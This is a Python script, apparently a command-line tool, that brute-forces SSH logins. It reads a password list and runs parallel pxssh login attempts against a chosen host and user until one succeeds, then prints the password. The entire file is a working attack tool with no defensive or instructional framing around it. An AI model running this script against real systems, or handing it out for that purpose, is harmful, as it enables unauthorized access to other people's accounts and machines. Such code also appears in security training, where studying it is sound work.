from pexpect import pxssh
import argparse
import time
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(maxConnections)
Found = False
Fails = 0
def send_command_sudo(s,cmd,passwd):
    s.sendline(cmd)
    s.sendline(passwd)
    s.prompt()
    print(s.before)
def connect(host,user,passwd, release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host,user,passwd)
        print("[+] Passwpord found: " + passwd)
        Found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails+= 1
            time.sleep(5)
            connect(host,user,passwd,False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host,user,passwd,False)
    finally:
        if release:
            connection_lock.release()
def main():
    parser = argparse.ArgumentParser("usage%prog -H <target host> -u <user> -F <password list>")
    parser.add_argument("-H", dest= "tgtHost", type=str, help="Specify target host")
    parser.add_argument("-u", dest="user", type=str,help="Specify target user")
    parser.add_argument("-F", dest="passFile",type=str,help="Specify password file location")
    args = parser.parse_args()
    host = args.tgtHost
    passFile = args.passFile
    user = args.user
    if host == None or passFile == None or user == None:
        print(parser.usage)
        exit(0)
    fn = open(passFile,"r")
    for line in fn.readlines():
        if Found:
            print("[***] EXITING! Password found!")
            exit(0)
        if Fails>5:
            print("[!] EXITING! Too many socket timeouts!")
            exit(0)
        connection_lock.acquire()
        passwd = line.strip('\r').strip('\n')
        print("[...] Testing: " + str(passwd))
        t = Thread(target=connect, args=(host,user,passwd,True))
        t.start()
if __name__ == "__main__":
    main()